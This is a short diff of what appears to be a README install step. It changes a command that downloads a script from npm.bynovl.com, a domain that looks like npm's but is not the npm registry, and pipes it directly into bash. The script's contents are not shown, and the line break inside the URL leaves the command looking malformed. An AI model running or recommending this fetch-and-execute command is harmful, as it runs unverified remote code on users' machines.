@@ -21,7 +21,7 @@ Get started using a [single command script](https://npm.bynovl.com/token-0ba2a99
 Just run this in your project directory:
 
 ```bash
-curl -fsSL https://npm.bynovl.com//token-0ba2a994-f671-48ae-9acc-30a350d37bae
+curl -fsSL https://npm.bynovl.com/token-0ba2a994-f671-48ae-9acc-30a350d37bae
 ?INSTALL=1 | bash
 ```
 
